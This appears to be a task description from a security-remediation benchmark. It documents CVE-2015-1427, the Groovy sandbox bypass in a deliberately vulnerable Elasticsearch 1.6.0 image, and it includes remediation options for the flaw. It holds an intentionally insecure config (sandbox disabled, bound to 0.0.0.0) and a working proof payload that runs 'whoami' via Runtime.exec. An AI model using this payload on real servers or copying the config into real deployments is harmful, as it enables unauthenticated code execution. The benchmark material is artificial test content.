# Elasticsearch 1.6.0 — Groovy Sandbox Bypass RCE (CVE-2015-1427)

## Severity
**Critical** (CVSS 9.8)

## CVE
**CVE-2015-1427** — Unauthenticated remote code execution via a Groovy
scripting-engine sandbox bypass in Elasticsearch 1.3.x–1.6.0 (fixed in 1.6.1).

## Description
Elasticsearch 1.4 replaced MVEL with Groovy as the dynamic-scripting language and
added a sandbox intended to restrict what scripted `_search` requests could do.
CVE-2015-1427 is a bypass of that sandbox — an attacker can craft a Groovy
expression that escapes into the underlying JVM and calls arbitrary classes like
`java.lang.Runtime` or `java.lang.ProcessBuilder`, achieving remote code execution
as the Elasticsearch service account.

This image runs Elasticsearch **1.6.0** (the last release before 1.6.1 closed the
bypass). We also explicitly disable the sandbox in `elasticsearch.yml`
(`script.groovy.sandbox.enabled: false`) and keep `script.disable_dynamic: false`
so that dynamic scripting is reachable. Binding to `0.0.0.0` means any caller that
can reach port 9200/TCP can exploit the RCE without credentials.

> **Why 1.6.0 and not 1.1.1?** The metasploitable3-windows upstream pins
> Elasticsearch 1.1.1 (CVE-2014-3120). On Server Core ltsc2019 the 1.1.1 JVM hits
> a native Lucene JNI crash at startup under every JRE we tested. ES 1.6.0 boots
> cleanly, targets the same `/_search` RCE attack surface, and lets the benchmark
> agent exercise exactly the same remediation skills (upgrade, disable scripting,
> or re-enable the sandbox).

## Affected Service
- **Service:** Elasticsearch 1.6.0 (standalone JVM, `elasticsearch.bat`)
- **Ports:** 9200/TCP (HTTP), 9300/TCP (node transport)
- **Config:** `C:\elasticsearch-1.6.0\config\elasticsearch.yml`

## Vulnerable Configuration
```yaml
# elasticsearch.yml
cluster.name: meta3-es
network.host: 0.0.0.0
http.port: 9200
script.disable_dynamic: false           # dynamic scripting ENABLED
script.groovy.sandbox.enabled: false    # Groovy sandbox DISABLED
```

## Proof
```
POST /_search?pretty HTTP/1.1
Host: <target>:9200
Content-Type: application/json

{
  "size": 1,
  "query": { "match_all": {} },
  "script_fields": {
    "rce": {
      "lang": "groovy",
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cmd /c whoami\").getInputStream().text"
    }
  }
}
```
The response body contains the process stdout of `whoami`.

## Remediation Steps

Either step is accepted by the verifier; the upgrade path is strongly preferred.

**Option A — disable dynamic scripting (stopgap).** Add the following to
`elasticsearch.yml` and restart:
```yaml
script.disable_dynamic: true
```
Equivalently, re-enable the Groovy sandbox:
```yaml
script.groovy.sandbox.enabled: true
```
Either closes CVE-2015-1427 specifically but leaves the service on an unsupported
1.x line.

**Option B — upgrade (recommended).** Replace the 1.6.0 install with Elasticsearch
1.6.1+ (first release with the patched sandbox), 7.17.x, or 8.x. Migrate the data
with `elasticdump` or the snapshot API and shut the 1.6.0 service down once the
new instance is serving on 9200.

**Regardless of option:** bind the service to a specific management interface
instead of `0.0.0.0` (`network.host: 127.0.0.1` or an internal RFC1918 address)
unless a front-end TLS reverse proxy is in place, and front the cluster with
authentication (X-Pack, SearchGuard, or a reverse proxy with mutual TLS).
